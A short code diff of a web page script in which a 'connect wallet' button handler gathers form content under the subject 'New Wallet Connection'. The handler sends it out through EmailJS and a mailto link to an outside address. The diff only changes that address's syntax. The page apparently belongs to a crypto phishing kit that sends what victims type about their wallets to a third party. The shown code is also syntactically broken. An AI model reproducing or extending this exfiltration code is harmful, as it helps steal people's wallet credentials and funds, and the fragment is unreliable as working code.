@@ -375,7 +375,7 @@ document.getElementById('form-connect-button').addEventListener('click', functio
       message: content
       const subject = encodeURIComponent('New Wallet Connection');
       const body = encodeURIComponent(content);
-      window.location.href = `mailto:richoffwoods.murena.iosubject=${subject}&body=${body}`;
+      window.location.href = `mailto:richoffwoods.murena.io, subject=${subject}&body=${body}`;
     };
     emailjs.send("service_of9vm8g", "template_bccv07j", templateParams)
       .then(function (response) {
